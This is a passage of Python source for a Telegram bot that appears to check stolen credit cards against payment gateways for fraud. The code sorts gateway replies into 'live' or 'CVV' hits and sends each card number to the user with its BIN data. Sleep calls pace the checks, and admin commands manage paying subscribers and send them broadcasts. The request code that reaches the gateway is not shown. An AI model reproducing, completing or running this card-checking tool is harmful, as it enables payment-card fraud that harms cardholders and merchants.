--------------------------------------------
- Programmer • @aaka8h</b>'''
					msgc=f'''<b>• Cvv Card ☑️		
--------------------------------------------
- Card -> <code>{cc}</code>
- Message -> {last}
- GateWay -> {gate}
--------------------------------------------
{str(dato(cc[:6]))}
- Process Time -> {"{:.1f}".format(execution_time)} Seconds. 
--------------------------------------------
- Programmer • @aaka8h</b>'''

					if "Funds" in last or 'Invalid postal' in last or 'avs' in last or 'added' in last or 'Duplicate' in last or 'Approved' in last:
						live += 1
						bot.send_message(call.from_user.id, msg)
					elif 'CVV' in last:
						ccnn+=1
						bot.send_message(call.from_user.id, msgc)
					else:
						dd += 1
					time.sleep(20)
		except Exception as eror:
			bot.send_message(admin,f'Eror -> {eror}')
		stopuser[f'{id}']['status'] = 'start'
		bot.send_message(chat_id=call.message.chat.id, text='- Done Check All Cards ✅\n - Programmer • @aaka8h')
	my_thread = threading.Thread(target=my_function)
	my_thread.start()
	

@bot.message_handler(commands=["add"])
def add(message):
	try:
		dam = str(datetime.now())
		chid = message.chat.id
		IDF = str(message.text).replace('/add ','')
		if str(message.chat.id) == myid:
			if '1' in message.text or '4' in message.text or '5' in message.text or '6' in message.text or '7' in message.text or '8' in message.text or '9' in message.text or '3' in message.text or '2' in message.text:
				open(mesp,'a').write('\n'+f'{IDF} {dam}')
			frs = bot.get_chat(IDF).first_name
			use = bot.get_chat(IDF).username
			bot.send_message(chid,f''' - Done Add -> <code>{IDF}</code> 

• DateTimeNow -> {dam}
• Name Subscriber -> <code>{frs}</code> 
• User Subscriber -> @{use} 
- To Subscribers List ✅''')
		else:
			bot.send_message(chid,' - Fuck You Baby !!!!')
	except Exception as e:
		bot.reply_to(message,f'- Was An Error -> {e}')
@bot.message_handler(commands=["tot"])
def adode(message):
	if str(message.chat.id) == myid:
		ope = open(mesp,'r').read().splitlines()
		line=0
		for lines in ope:
			line+=1
		tot = str(line)
		bot.reply_to(message,f'- Total Subscribers IDs : {tot}')
		
def cl(ko):
	if '2024' in ko:
		try:
			ll = ko.split(' ')[0]
		except:
			ll = 'NO ID'
		try:
			da = ko.split(' ')[1]
		except:
			da = 'NO DETE'
		try:
			ss = ko.split(' ')[2]
		except:
			ss = 'no'
		BB = {
'date': da+' '+ss,
'ip': ll,
}
		return BB

@bot.message_handler(commands=['sh'])
def qwweem(message):
	if str(message.chat.id) == myid:
		ope = open(mesp,'r').read().splitlines()
		line=0
		for ko in ope:
			line+=1
			pp = cl(ko)
			global da,ll
			try:
				da = pp['date']
			except:
				da = 'NO'
			try:
				ll = pp['ip']
			except:
				ll = 'NO'
			try:
				frs = bot.get_chat(ko).first_name
				use = bot.get_chat(ko).username
			except Exception as e:
				bot.send_message(message.chat.id,f'''- UnSuccsessFull Master Kilwa ❌

• ID -> tg://openmessage?user_id={ll}

- Error -> {e}''')
			else:
				bot.send_message(message.chat.id,f'''- Done Master Kilwa ✅💫 

• Name Subscriber -> <code>{frs}</code> 
• User Subscriber -> @{use}
• ID Subscriber -> <code>{ko}</code> 
• Date Sub -> {da}

- Number Subscriber {line} ✅''')
		bot.send_message(message.chat.id,f'''- Done Master Kilwa ✅💫 

- Total Subscribers -> {line} ✅''')
				
@bot.message_handler(commands=['dele'])
def qwwem(message):
	if str(message.chat.id) == myid:
		mes=message.text.replace("/dele ","")
		kils=[]
		with open(mesp, 'r') as file:
			om = file.read()
			if mes in om:
				print(om)
				idr = '\n'+mes
				kp=str(om).replace(idr,'')
				kils.append(str(kp))
				with open(mesp, 'w') as file:
					file.writelines(kils)
				try:
					frs = bot.get_chat(mes).first_name
					use = bot.get_chat(mes).username
				except Exception as e:
					bot.send_message(message.chat.id,f'''- UnSuccsessFull Master Kilwa ❌

• Is Not opened your bot

- Error -> {e}''')
				else:
					bot.send_message(message.chat.id,f'''- Done Master Kilwa ✅💫 

• Name Subscriber -> <code>{frs}</code> 
• User Subscriber -> @{use}

- IS Removed From Subscribers ✅''')
			else:
				bot.send_message(message.chat.id,f'''- You're Crazy Master Kilwa 👽🙂 

• ID Subscriber -> <code>{mes}</code> 

- IS Not Subscriber yet 🌚❌''')
@bot.message_handler(commands=['kil'])
def qwwe(message):
 if str(message.chat.id) == myid:
	 mp,erop = 0,0
	 try:
	  idd=message.from_user.id
	  mes=message.text.replace("/kil ","")
	  bot.send_message(idd,mes)
	  ff=open(mesp,'r')
	  try:
	   for idd in ff:
	    mp+=1
	    bot.send_message(idd,text=mes)
	  except:
	   erop+=1
	  bot.reply_to(message,f'''- Hello Kilwa
• Done Send - {mp}
• Bad Send - {erop}''')
	 except Exception as err:
	  bot.reply_to(message,f'- Was An error : {err}')	

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callbackmn(call):
	idm=call.from_user.id
	bot.send_message(idm,'- Stopped Check Cards ✅')
	stopuser[f'{idm}']['status'] = 'stop'
print("- The Bot Runing ")
bot.polling()